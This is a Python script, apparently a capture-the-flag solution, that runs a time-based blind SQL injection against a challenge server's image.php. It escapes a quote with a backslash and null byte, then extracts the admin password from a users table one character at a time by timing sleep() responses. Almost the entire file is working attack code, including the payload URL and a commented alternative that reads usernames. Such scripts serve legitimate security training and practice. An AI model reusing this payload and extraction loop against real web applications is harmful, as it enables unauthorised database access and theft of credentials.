import requests
import re
import time

heads = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
}

results = ''

for z in range(1,21):
    for x in range(32,127):
        start_time = time.time()
        #fe44e9V69843e*a5459

        url = 'http://bbf3938a-6397-4c03-bce5-0db246aec4f5.node3.buuoj.cn/image.php?id=1111\\0%27&path=or if(ascii(substr((select password from users where username=0x61646d696e),'+str(z)+',1))='+str(x)+',sleep(1),1) %23\\0%27'
        # url = 'http://bbf3938a-6397-4c03-bce5-0db246aec4f5.node3.buuoj.cn/image.php?id=1111\\0\'&path=or if(ascii(substr((select username from users where id=2),'+str(z)+',1))='+str(x)+',sleep(1),1) #\\0\''

        print(url)
        r = requests.get(url,headers=heads)
        end_time = time.time()
        true_result = end_time - start_time
        # if r.status_code != 200:
        print(r.status_code)
        # print(r.text)

        if (r.status_code == 200 and true_result >= 3.0):
            print(r.text)
            print("成功")
            
            results += chr(x)
            
            print(results)
            break

print("最后的结果为：",results)
